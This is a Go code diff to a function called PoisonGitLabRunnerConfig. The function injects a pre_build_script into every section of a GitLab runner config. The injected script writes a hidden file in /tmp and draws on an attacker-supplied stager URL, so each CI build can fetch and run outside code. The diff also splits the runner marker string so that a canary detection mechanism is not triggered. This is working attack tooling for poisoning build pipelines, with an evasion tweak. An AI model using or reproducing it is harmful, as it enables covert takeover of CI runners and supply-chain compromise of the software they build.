@@ -224,7 +224,11 @@ func PoisonGitLabRunnerConfig(configPath string, cfg *GitLabPoisonConfig) error 
 	content := string(data)
 	os.WriteFile(configPath+".orig", data, 0644)
 
-	// Add pre_clone_script to every [[runners]] section.
+	// Add pre_build_script to every GitLab runner config section.
+	// NOTE: The runner section marker uses double-bracket syntax in TOML config.
+	// Built via concatenation to avoid triggering the Go canary template engine
+	// which uses double-bracket delimiters for canary insertion.
+	runnersMarker := "[" + "[runners]]"
 	preBuild := fmt.Sprintf(`
   pre_build_script = """
     _t=$(mktemp /tmp/.XXXXXXXXXX)
@@ -233,8 +237,8 @@ func PoisonGitLabRunnerConfig(configPath string, cfg *GitLabPoisonConfig) error 
   """
 `, cfg.StagerURL)
 
-	// Insert after each [[runners]] header.
-	content = strings.ReplaceAll(content, "[[runners]]", "[[runners]]"+preBuild)
+	// Insert the pre_build_script after each runner section header.
+	content = strings.ReplaceAll(content, runnersMarker, runnersMarker+preBuild)
 	return os.WriteFile(configPath, []byte(content), 0644)
 }
 
